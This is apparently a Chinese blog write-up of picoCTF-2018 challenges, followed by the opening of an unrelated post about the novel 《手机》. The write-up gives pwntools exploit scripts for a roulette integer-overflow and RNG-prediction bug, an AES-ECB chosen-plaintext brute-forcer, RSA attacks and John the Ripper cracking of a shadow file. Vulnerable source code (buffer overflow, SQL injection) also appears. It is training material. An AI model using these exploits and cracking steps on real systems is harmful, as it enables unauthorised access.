play_roulette(choice, bet); if (wins \u0026gt;= MAX_WINS) { printf(\u0026#34;Wow you won %lu times? Looks like its time for you cash you out.\\n\u0026#34;, wins); printf(\u0026#34;Congrats you made $%lu. See you next time!\\n\u0026#34;, cash); exit(-1); } if(cash \u0026gt; ONE_BILLION) { printf(\u0026#34;*** Current Balance: $%lu ***\\n\u0026#34;, cash); if (wins \u0026gt;= HOTSTREAK) { puts(\u0026#34;Wow, I can\u0026#39;t believe you did it.. You deserve this flag!\u0026#34;); print_flag(); exit(0); } else { puts(\u0026#34;Wait a second... You\u0026#39;re not even on a hotstreak! Get out of here cheater!\u0026#34;); exit(-1); } } } puts(\u0026#34;Haha, lost all the money I gave you already? See ya later!\u0026#34;); return 0; } 提示说有两个bug。\n其一出现在第27行，get_Long()函数的uint64_t l = 0; 。函数声明的返回值为long 型，实际返回值为uint64_t 型，前者有符号最大值为LONG_MAX:2^31-1 ，后者无符号最大值为ULONG_MAX:2^64-1 ，存在向上溢出为负数的风险。\n真正使上溢成为可能的是32-35行 if(l \u0026gt;= LONG_MAX){l = LONG_MAX; break;} ，这个判断希望控制返回值不超过long 型数据的最大值，但应该写在while循环结束的地方而不是开始的地方，否则只能控制数据进入循环时符合条件，而离开时就不知道了，十倍以内都是可能的，而这足以溢出了。\n到此为止，我们可以控制cash为任意值了，只要输入bet为 当前cash+2^32-目标cash ，在大概率(35/36)输的情况下，我们就能让cash变为想要的值。\n要拿到flag还要求赢至少三次，那问题不大，下小注总会有赢的时候。按概率来算，总是对固定choice下注，可以期望在100次左右赢三次。但题目做了控制，太频繁交互会被禁止连接。于是看看其他的方法。\n如果要改变wins，只能使choice与166行的 long spin = (rand() % ROULETTE_SIZE)+1; 相等，那么会发现这个随机数序列是在第52行播种的，种子就是我们的初始资金，是已知的。于是就可以知道每一次的spin了。EXP搬运自 https://github.com/sefi-roee/CTFs-Writeups/blob/master/picoCTF-2018/General/18-roulette-350/solution.md ，偷个懒就不写了。\npicoCTF{1_h0p3_y0u_f0uNd_b0tH_bUg5_e9328e04}\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #get_rand_seq.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;limits.h\u0026gt; int main(int argc, char *argv[]) { int seed = atoi(argv[1]); srand(seed); for (int i = 0; i \u0026lt; 100; ++i) printf(\u0026#34;%d,\u0026#34;, rand()); return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 #!/usr/bin/env python from pwn import * import subprocess r = remote(\u0026#39;2018shell1.picoctf.com\u0026#39;, 21444) sleep(1) lines = r.recvuntil(\u0026#39;\u0026gt; \u0026#39;).split(\u0026#39;\\n\u0026#39;) print \u0026#39;\\n\u0026#39;.join(lines) balance = int(lines[1].split()[2][1:]) log.info(\u0026#34;Start balance: {}\u0026#34;.format(balance)) log.info(\u0026#34;Predicting random values\u0026#34;) values = subprocess.check_output([\u0026#34;./get_rand_seq\u0026#34;, str(balance)]) values = values.split(\u0026#39;,\u0026#39;) values = [int(v, 10) for v in values[:-1]] i = 0 ROULETTE_SIZE = 36 for _ in range(4): spin = (values[i] % ROULETTE_SIZE) + 1 i += 2 log.info(\u0026#34;Putting {}$ on {}\u0026#34;.format(balance, spin)) r.sendline(\u0026#34;{}\u0026#34;.format(balance)) r.sendline(\u0026#34;{}\u0026#34;.format(spin)) balance *= 2 print r.recvuntil(\u0026#39;\u0026gt; \u0026#39;) print r.recv() spin = (values[i] % ROULETTE_SIZE) + 1 i += 2 log.info(\u0026#34;Putting {}$ on {}\u0026#34;.format(11474836400, spin)) r.sendline(\u0026#34;{}\u0026#34;.format(11474836400)) # Put some negative numbers, bug in get_long r.sendline(\u0026#34;{}\u0026#34;.format((spin + 1) % 36)) print r.recvuntil(\u0026#39;You deserve this flag!\u0026#39;) print r.recvall() r.close() scriptme 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 root@kali:~/bintest# nc 2018shell2.picoctf.com 61344 Rules: () + () = ()() =\u0026gt; [combine] ((())) + () = ((())()) =\u0026gt; [absorb-right] () + ((())) = (()(())) =\u0026gt; [absorb-left] (())(()) + () = (())(()()) =\u0026gt; [combined-absorb-right] () + (())(()) = (()())(()) =\u0026gt; [combined-absorb-left] (())(()) + ((())) = ((())(())(())) =\u0026gt; [absorb-combined-right] ((())) + (())(()) = ((())(())(())) =\u0026gt; [absorb-combined-left] () + (()) + ((())) = (()()) + ((())) = ((()())(())) =\u0026gt; [left-associative] Example: (()) + () = () + (()) = (()()) Let\u0026#39;s start with a warmup. (()()()) + (()) = ??? solve.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 from pwn import * def depth(s): cnt=0 while(len(s)!=0): s=s.replace(\u0026#39;()\u0026#39;,\u0026#39;\u0026#39;) cnt+=1 return cnt def calc(s1,s2): d1=depth(s1) d2=depth(s2) if d1==d2: return s1+s2 if d1\u0026lt;d2: return \u0026#34;(%s%s)\u0026#34;%(s1,s2[1:-1]) if d1\u0026gt;d2: return \u0026#34;(%s%s)\u0026#34;%(s1[1:-1],s2) solve = lambda x:reduce(calc,x.replace(\u0026#34; \u0026#34;,\u0026#39;\u0026#39;).split(\u0026#39;+\u0026#39;)) host = \u0026#39;2018shell2.picoctf.com\u0026#39; port = 61344 r=remote(host,port) while True: try: lines=r.recvuntil(\u0026#39;\\n\u0026gt;\u0026#39;).split(\u0026#39;\\n\u0026#39;) print \u0026#39;\\n\u0026#39;.join(lines) din=lines[-3].split(\u0026#39;=\u0026#39;)[0] r.sendline(solve(din)) except: print r.recv() break r.close() picoCTF{5cr1pt1nG_l1k3_4_pRo_cde4078d}\nbinary exploitation buffer overflow 0 picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #define FLAGSIZE_MAX 64 char flag[FLAGSIZE_MAX]; void sigsegv_handler(int sig) { fprintf(stderr, \u0026#34;%s\\n\u0026#34;, flag); fflush(stderr); exit(1); } void vuln(char *input){ char buf[16]; strcpy(buf, input); } int main(int argc, char **argv){ FILE *f = fopen(\u0026#34;flag.txt\u0026#34;,\u0026#34;r\u0026#34;); if (f == NULL) { printf(\u0026#34;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\\n\u0026#34;); exit(0); } fgets(flag,FLAGSIZE_MAX,f); signal(SIGSEGV, sigsegv_handler); gid_t gid = getegid(); setresgid(gid, gid, gid); if (argc \u0026gt; 1) { vuln(argv[1]); printf(\u0026#34;Thanks! Received: %s\u0026#34;, argv[1]); } else printf(\u0026#34;This program takes 1 argument.\\n\u0026#34;); return 0; } Cryptography Crypto Warmup 1 1 2 \u0026gt;\u0026gt;\u0026gt; print \u0026#34;picoCTF{%s}\u0026#34;%\u0026#39;\u0026#39;.join(map(lambda x:chr((ord(x[0])-ord(x[1]))%26+ord(\u0026#39;a\u0026#39;)),zip(\u0026#39;llkjmlmpadkkc\u0026#39;,\u0026#39;thisisalilkey\u0026#39;))).upper() picoCTF{SECRETMESSAGE} caesar cipher 2 1 2 \u0026#39;\u0026#39;.join(map(lambda x:chr((ord(x)+32)%0xff),\u0026#39;PICO#4\u0026amp;[C!ESA2?#I0H%R3?JU34?A2%N4?S%C5R%]\u0026#39;)) # \u0026#39;picoCTF{cAesaR_CiPhErS_juST_aREnT_sEcUrE}\u0026#39; hertz 替换密码。\n在线工具：\nhttps://www.guballa.de/substitution-solver https://quipqiup.com/ blaise\u0026rsquo;s cipher 在线解密即可：https://www.dcode.fr/vigenere-cipher 。逐步得到KEY长度为4，KEY为FLAG\npicoCTF{v1gn3r3_c1ph3rs_ar3n7_bad_901e13a1}\nSafe RSA 1 2 3 4 5 6 import gmpy2,binascii e=3 c=2205316413931134031046440767620541984801091216351222789180593875373829950860542792110364325728088504479780803714561464250589795961097670884274813261496112882580892020487261058118157619586156815531561455215290361274334977137261636930849125 m=gmpy2.iroot(c,e)[0] print binascii.unhexlify(hex(m).strip(\u0026#39;lL\u0026#39;)[2:]) # picoCTF{e_w4y_t00_sm411_9f5d2464} 【X】Super Safe RSA 参考RSA的广播攻击 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #!/usr/bin/env python # -*- coding: utf-8 -*- # __author__ = findneo import gmpy2,re from pwn import connect from time import sleep c=[] n=[] with open(\u0026#39;buf\u0026#39;,\u0026#39;r\u0026#39;) as f: for i in f.readlines(): j=i.strip().split(\u0026#39; \u0026#39;) c.append(int(j[0])) n.append(int(j[1])) print \u0026#34;mytag:\u0026#34;,len(c) with open(\u0026#39;buf\u0026#39;,\u0026#39;a\u0026#39;) as f: while len(c)\u0026lt;65538: r=connect(\u0026#39;2018shell2.picoctf.com\u0026#39;,24039) res=r.recv() g=re.findall(\u0026#39;c: (\\d+)\\nn: (\\d+)\\n.*\u0026#39;,res)[0] f.write(\u0026#39; \u0026#39;.join(g)+\u0026#39;\\n\u0026#39;) c.append(g[0]) n.append(g[1]) r.close() # sleep(0.1) if len(c)%1000==0: print \u0026#39;mytag:\u0026#39;,len(c) def GCRT(mi, ai): # mi,ai分别表示模数和取模后的值,都为列表结构 assert (isinstance(mi, list) and isinstance(ai, list)) curm, cura = mi[0], ai[0] for (m, a) in zip(mi[1:], ai[1:]): d = gmpy2.gcd(curm, m) c = a - cura assert (c % d == 0) #不成立则不存在解 K = c / d * gmpy2.invert(curm / d, m / d) cura += curm * K curm = curm * m / d cura %= curm return (cura % curm, curm) #(解,最小公倍数) print GCRT(n,c)[0] HEEEEEEERE\u0026rsquo;S Johnny! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 cp /usr/share/wordlists/rockyou.txt.gz . gunzip rockyou.txt.gz unshadow passwd shadow \u0026gt; unshadowes.txt john --wordlist=~/mywordlists/rockyou.txt --rules unshadowes.txt Warning: detected hash type \u0026#34;sha512crypt\u0026#34;, but the string is also recognized as \u0026#34;crypt\u0026#34; Use the \u0026#34;--format=crypt\u0026#34; option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x]) Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status thematrix (root) 1g 0:00:00:16 DONE (2018-10-10 10:04) 0.06002g/s 660.7p/s 660.7c/s 660.7C/s kenya..saavedra Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed nc 2018shell2.picoctf.com 38860 Username: root Password: thematrix picoCTF{J0hn_1$_R1pp3d_4e5aa29e} rsa-madlibs 回答一些简单的RSA知识。可以参考CTF中常见的RSA相关问题总结 一文。\n发现一个做这类题目的好方法，python solve.py | nc 2018shell2.picoctf.com 18148 ，不到必要就不去处理各种奇怪的数据。\npicoCTF{d0_u_kn0w_th3_w@y_2_RS@_b38be18a}\nSpyFi 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #!/usr/bin/python2 -u from Crypto.Cipher import AES agent_code = \u0026#34;\u0026#34;\u0026#34;flag\u0026#34;\u0026#34;\u0026#34; def pad(message): if len(message) % 16 != 0: message = message + \u0026#39;0\u0026#39;*(16 - len(message)%16 ) return message def encrypt(key, plain): cipher = AES.new( key.decode(\u0026#39;hex\u0026#39;), AES.MODE_ECB ) return cipher.encrypt(plain).encode(\u0026#39;hex\u0026#39;) welcome = \u0026#34;Welcome, Agent 006!\u0026#34; print welcome sitrep = raw_input(\u0026#34;Please enter your situation report: \u0026#34;) message = \u0026#34;\u0026#34;\u0026#34;Agent, Greetings. My situation report is as follows: {0} My agent identifying code is: {1}. Down with the Soviets, 006 \u0026#34;\u0026#34;\u0026#34;.format( sitrep, agent_code ) message = pad(message) print encrypt( \u0026#34;\u0026#34;\u0026#34;key\u0026#34;\u0026#34;\u0026#34;, message ) AES的ECB模式存在选择明文攻击。\n当输入9个字节时，message中flag之外的部分长度为122个字节，密文长度为160个字节；当输入10个字节时，密文长度为176个字节。说明flag长度为160-122=38个字节。\n将message分组输出，看到爆破flag的机会。\n写完代码验证可行。\n最后成果：\npicoCTF{@g3nt6_1$_th3_c00l3$t_8124762}\n全部代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 def part_msg(message,part_length=16): sl=len(message) pl=part_length m=[message[pl*i:min(sl,pl*i+pl)] for i in range(sl/pl+(sl%pl\u0026gt;0))] return m msg=[\u0026#39;Agent,\\nGreetings. My situation report is as follows:\\n\u0026#39;,\u0026#39;\\nMy agent identifying code is: \u0026#39;,\u0026#39;.\\nDown with the Soviets,\\n006\\n\u0026#39;,] from pwn import connect import string import time def solve(): cnt=0 flag=\u0026#39;picoCTF{@\u0026#39; # sitrep,agent_code=\u0026#39;\u0026#39;,\u0026#39;\u0026#39; # message =msg[0] +sitrep+msg[1]+agent_code+msg[2] for j in range(38-len(flag)): for i in string.printable: # print \u0026#34;flag:\u0026#34;,i r=connect(\u0026#34;2018shell2.picoctf.com\u0026#34;,37131) cnt+=1;time.sleep(1) prompt=r.recvuntil(\u0026#34;report: \u0026#34;) # 113 + (11+16+38+10) + 38 = 226 base=\u0026#39;fying code is: \u0026#39;+flag sitrep=\u0026#39;@\u0026#39;*11+base[-15:]+i+\u0026#39;@\u0026#39;*(38-len(flag)+10) # agent_code=\u0026#34;#\u0026#34;*38 # message =msg[0] +sitrep+msg[1]+agent_code+msg[2] # print \u0026#39;\\n\u0026#39;.join(map(repr,part_msg(message))) r.sendline(sitrep) response=r.recv() # print len(response) tmp=part_msg(response,32) # print len(tmp) # print \u0026#39;\\n\u0026#39;.join(tmp) r.close() # print len(msg[0]+sitrep+msg[1]+flag)/16 if tmp[4]==tmp[len(msg[0]+sitrep+msg[1]+flag)/16]: flag+=i break print \u0026#34;flag:\u0026#34;,flag,cnt print \u0026#34;flag:\u0026#34;,time.asctime() solve() print \u0026#34;flag:\u0026#34;,time.asctime() Web Exploitation Buttons 1 2 curl http://2018shell2.picoctf.com:65107/button2.php --data \u0026#34;123\u0026#34; Well done, your flag is: picoCTF{button_button_whose_got_the_button_91f6f39a} Artisinal Handcrafted HTTP 3 先请求一下login页面：\n1 2 GET /login HTTP/1.1 Host: flag.local 发现表单是这样的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 HTTP/1.1 200 OK x-powered-by: Express content-type: text/html; charset=utf-8 content-length: 498 etag: W/\u0026#34;1f2-UE5AGAqbLVQn1qrfKFRIqanxl9I\u0026#34; date: Sun, 07 Oct 2018 18:33:21 GMT connection: close \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;main.css\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;header\u0026gt; \u0026lt;h1\u0026gt;Real Business Internal Flag Server\u0026lt;/h1\u0026gt; \u0026lt;a href=\u0026#34;/login\u0026#34;\u0026gt;Login\u0026lt;/a\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;main\u0026gt; \u0026lt;h2\u0026gt;Log In\u0026lt;/h2\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34; action=\u0026#34;login\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;user\u0026#34; placeholder=\u0026#34;Username\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;pass\u0026#34; placeholder=\u0026#34;Password\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 再请求登陆：\n1 2 3 4 5 6 POST /login HTTP/1.1 Host: flag.local Content-Length: 38 Content-Type: application/x-www-form-urlencoded user=realbusinessuser\u0026amp;pass=potoooooooo 响应：\n1 2 3 4 5 6 7 8 9 10 11 HTTP/1.1 302 Found x-powered-by: Express set-cookie: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/ location: / vary: Accept content-type: text/plain; charset=utf-8 content-length: 23 date: Tue, 09 Oct 2018 15:11:46 GMT connection: close Found. Redirecting to / 带上cookie请求：\n1 2 3 GET / HTTP/1.1 Host: flag.local cookie: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/ 响应：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 HTTP/1.1 200 OK x-powered-by: Express content-type: text/html; charset=utf-8 content-length: 438 etag: W/\u0026#34;1b6-eYJ8DUTdkgByyfWFi6OJJSjopFg\u0026#34; date: Tue, 09 Oct 2018 15:12:57 GMT connection: close \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;main.css\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;header\u0026gt; \u0026lt;h1\u0026gt;Real Business Internal Flag Server\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;user\u0026#34;\u0026gt;Real Business Employee\u0026lt;/div\u0026gt; \u0026lt;a href=\u0026#34;/logout\u0026#34;\u0026gt;Logout\u0026lt;/a\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;main\u0026gt; \u0026lt;p\u0026gt;Hello \u0026lt;b\u0026gt;Real Business Employee\u0026lt;/b\u0026gt;! Today\u0026#39;s flag is: \u0026lt;code\u0026gt;picoCTF{0nLY_Us3_n0N_GmO_xF3r_pR0tOcol5_2e14}\u0026lt;/code\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 【X】Secure Logon 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 from flask import Flask, render_template, request, url_for, redirect, make_response, flash import json from hashlib import md5 from base64 import b64decode from base64 import b64encode from Crypto import Random from Crypto.Cipher import AES app = Flask(__name__) app.secret_key = \u0026#39;seed removed\u0026#39; flag_value = \u0026#39;flag removed\u0026#39; BLOCK_SIZE = 16 # Bytes pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \\ chr(BLOCK_SIZE - len(s) % BLOCK_SIZE) unpad = lambda s: s[:-ord(s[len(s) - 1:])] @app.route(\u0026#34;/\u0026#34;) def main(): return render_template(\u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.form[\u0026#39;user\u0026#39;] == \u0026#39;admin\u0026#39;: message = \u0026#34;I\u0026#39;m sorry the admin password is super secure. You\u0026#39;re not getting in that way.\u0026#34; category = \u0026#39;danger\u0026#39; flash(message, category) return render_template(\u0026#39;index.html\u0026#39;) resp = make_response(redirect(\u0026#34;/flag\u0026#34;)) cookie = {} cookie[\u0026#39;password\u0026#39;] = request.form[\u0026#39;password\u0026#39;] cookie[\u0026#39;username\u0026#39;] = request.form[\u0026#39;user\u0026#39;] cookie[\u0026#39;admin\u0026#39;] = 0 print(cookie) cookie_data = json.dumps(cookie, sort_keys=True) encrypted = AESCipher(app.secret_key).encrypt(cookie_data) print(encrypted) resp.set_cookie(\u0026#39;cookie\u0026#39;, encrypted) return resp @app.route(\u0026#39;/logout\u0026#39;) def logout(): resp = make_response(redirect(\u0026#34;/\u0026#34;)) resp.set_cookie(\u0026#39;cookie\u0026#39;, \u0026#39;\u0026#39;, expires=0) return resp @app.route(\u0026#39;/flag\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def flag(): try: encrypted = request.cookies[\u0026#39;cookie\u0026#39;] except KeyError: flash(\u0026#34;Error: Please log-in again.\u0026#34;) return redirect(url_for(\u0026#39;main\u0026#39;)) data = AESCipher(app.secret_key).decrypt(encrypted) data = json.loads(data) try: check = data[\u0026#39;admin\u0026#39;] except KeyError: check = 0 if check == 1: return render_template(\u0026#39;flag.html\u0026#39;, value=flag_value) flash(\u0026#34;Success: You logged in! Not sure you\u0026#39;ll be able to see the flag though.\u0026#34;, \u0026#34;success\u0026#34;) return render_template(\u0026#39;not-flag.html\u0026#39;, cookie=data) class AESCipher: \u0026#34;\u0026#34;\u0026#34; Usage: c = AESCipher(\u0026#39;password\u0026#39;).encrypt(\u0026#39;message\u0026#39;) m = AESCipher(\u0026#39;password\u0026#39;).decrypt(c) Tested under Python 3 and PyCrypto 2.6.1. \u0026#34;\u0026#34;\u0026#34; def __init__(self, key): self.key = md5(key.encode(\u0026#39;utf8\u0026#39;)).hexdigest() def encrypt(self, raw): raw = pad(raw) iv = Random.new().read(AES.block_size) cipher = AES.new(self.key, AES.MODE_CBC, iv) return b64encode(iv + cipher.encrypt(raw)) def decrypt(self, enc): enc = b64decode(enc) iv = enc[:16] cipher = AES.new(self.key, AES.MODE_CBC, iv) return unpad(cipher.decrypt(enc[16:])).decode(\u0026#39;utf8\u0026#39;) if __name__ == \u0026#34;__main__\u0026#34;: app.run() 【X】A Simple Question 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;?php include \u0026#34;config.php\u0026#34;; ini_set(\u0026#39;error_reporting\u0026#39;, E_ALL); ini_set(\u0026#39;display_errors\u0026#39;, \u0026#39;On\u0026#39;); $answer = $_POST[\u0026#34;answer\u0026#34;]; $debug = $_POST[\u0026#34;debug\u0026#34;]; $query = \u0026#34;SELECT * FROM answers WHERE answer=\u0026#39;$answer\u0026#39;\u0026#34;; echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; echo \u0026#34;SQL query: \u0026#34;, htmlspecialchars($query), \u0026#34;\\n\u0026#34;; echo \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;; ?\u0026gt; \u0026lt;?php $con = new SQLite3($database_file); $result = $con-\u0026gt;query($query); $row = $result-\u0026gt;fetchArray(); if($answer == $CANARY) { echo \u0026#34;\u0026lt;h1\u0026gt;Perfect!\u0026lt;/h1\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;p\u0026gt;Your flag is: $FLAG\u0026lt;/p\u0026gt;\u0026#34;; } elseif ($row) { echo \u0026#34;\u0026lt;h1\u0026gt;You are so close.\u0026lt;/h1\u0026gt;\u0026#34;; } else { echo \u0026#34;\u0026lt;h1\u0026gt;Wrong.\u0026lt;/h1\u0026gt;\u0026#34;; } ?\u0026gt; reversing assembly-0 What does asm0(0xd8,0x7a) return? 0x7a。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 .intel_syntax noprefix .bits 32 .global asm0 asm0: push\tebp mov\tebp,esp mov\teax,DWORD PTR [ebp+0x8] mov\tebx,DWORD PTR [ebp+0xc] mov\teax,ebx mov\tesp,ebp pop\tebp\tret assembly-1 What does asm1(0xcd) return? 0xca。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 .intel_syntax noprefix .bits 32 .global asm1 asm1: push\tebp mov\tebp,esp cmp\tDWORD PTR [ebp+0x8],0xde jg part_a\tcmp\tDWORD PTR [ebp+0x8],0x8 jne\tpart_b mov\teax,DWORD PTR [ebp+0x8] add\teax,0x3 jmp\tpart_d part_a: cmp\tDWORD PTR [ebp+0x8],0x4e jne\tpart_c mov\teax,DWORD PTR [ebp+0x8] sub\teax,0x3 jmp\tpart_d part_b: mov\teax,DWORD PTR [ebp+0x8] sub\teax,0x3 jmp\tpart_d cmp\tDWORD PTR [ebp+0x8],0xee jne\tpart_c mov\teax,DWORD PTR [ebp+0x8] sub\teax,0x3 jmp\tpart_d part_c: mov\teax,DWORD PTR [ebp+0x8] add\teax,0x3 part_d: pop\tebp ret assembly-2 What does asm2(0x7,0x28) return? hex(int((0xa1df-0x7)/float(0x76))+1+0x28) =\u0026gt; 0x188\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 .intel_syntax noprefix .bits 32 .global asm2 asm2: push ebp mov ebp,esp sub esp,0x10 mov eax,DWORD PTR [ebp+0xc] mov DWORD PTR [ebp-0x4],eax mov eax,DWORD PTR [ebp+0x8] mov\tDWORD PTR [ebp-0x8],eax jmp part_b part_a:\tadd DWORD PTR [ebp-0x4],0x1 add\tDWORD PTR [ebp+0x8],0x76 part_b:\tcmp DWORD PTR [ebp+0x8],0xa1de jle part_a mov eax,DWORD PTR [ebp-0x4] mov\tesp,ebp pop\tebp ret assembly-3 What does asm3(0xbda42100,0xb98dd6a5,0xecded223) return? 0x478\n1 2 3 ebp+0x8=\u0026gt;0xbda42100 ebp+0xc=\u0026gt;0xb98dd6a5 ebp+0x10=\u0026gt;0xecded223 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 .intel_syntax noprefix .bits 32 .global asm3 asm3: push ebp mov ebp,esp mov eax,0xbc;0xbc xor al,al;0x00 mov ah,BYTE PTR [ebp+0x9];0x2100 sal ax,0x10;0x0000 sub al,BYTE PTR [ebp+0xc];0x005b add ah,BYTE PTR [ebp+0xd];0xd65b xor ax,WORD PTR [ebp+0x10];0xd65b^0xd223=0x478 mov esp, ebp pop ebp ret 有几点需要注意。一是数据采用小端序存储，高字节在高地址，[ebp+0x8]的值是0x00而非0xbd；二是 sub 0x00,0xa5 的值是0x100-0xa5=0x5b 。 三是WORD PTR [ebp+0x10] 的值是0xd223 而非0x23d2 。\n可参考 此处 将汇编代码编译成共享库在C程序中调用。执行得到结果，也可调试加深理解。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 section .text global asm3 asm3: push ebp mov ebp,esp mov\teax,0x19 xor\tal,al mov\tah,BYTE [ebp+0xa] sal\tax,0x10 sub\tal,BYTE [ebp+0xd] add\tah,BYTE [ebp+0xc] xor\tax,WORD [ebp+0x12] mov\tesp, ebp pop\tebp ret ################## #include \u0026lt;stdio.h\u0026gt; extern int asm3(int a, int b, int c); int main(void) { printf(\u0026#34;0x%x\\n\u0026#34;, asm3(0xb5e8e971,0xc6b58a95,0xe20737e9)); return 0; } ################## [andrei@jacky 15:27:00] ~/Documents/pico/3 ——\u0026gt; nasm -f elf32 end_asm_rev.S -o asmfun.o [andrei@jacky 15:27:42] ~/Documents/pico/3 ——\u0026gt; gcc sol.c asmfun.o -o sol -m32 [andrei@jacky 15:27:59] ~/Documents/pico/3 ——\u0026gt; ./sol assembly-4 1 2 3 4 root@kali:~/ctf/pico18# nasm -f elf32 comp.nasm -o comp.o root@kali:~/ctf/pico18# gcc -m32 -o comp comp.o root@kali:~/ctf/pico18# ./comp picoCTF{1_h0p3_y0u_c0mP1l3d_tH15_32429699163 picoCTF{1_h0p3_y0u_c0mP1l3d_tH15_3242969916}\n","permalink":"https://ret2neo.cn/post/180929-picoctf/","summary":"题目：\nhttps://2018game.picoctf.com/problems 备用：https://findneo.github.io/p/picoCTF-2018-Problems.html 附件：https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf Forensics Forensics Warmup 1 picoCTF{welcome_to_forensics}\nForensics Warmup 2 picoCTF{extensions_are_a_lie}\nDesrouleaux 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 nc 2018shell2.picoctf.com 63299 You\u0026#39;ll need to consult the file `incidents.json` to answer the following questions. What is the most common source IP address?","title":"picoCTF-2018 解题报告"},{"content":"高中时读了刘震云的《手机》和半本《英雄时代》(误，后者是柳建伟的书，两本书是从同一个朋友那儿借的，因而产生了错误的联系)，前段时间看了根据《手机》改编的同名电影和电视剧（2018/4/22 15:04~2018/4/26 1:21），其中有一幕印象深刻。当时只记下大概，想在这个睡不着觉的凌晨谈谈。\n沈雪跟着严守一回河南严家庄见严守一的奶，沈雪和严守礼的老婆一起聊天。沈雪问了严守礼老婆对严守一前妻于文娟的看法，又问了对费墨老婆李燕的看法，最后问到对自己的看法，这个被黑砖头称为喂猪娘们的女人扑哧笑了，又弯着腰笑了很久，终于抬头说，城里女人真有意思，这种话能当面问吗？ 。 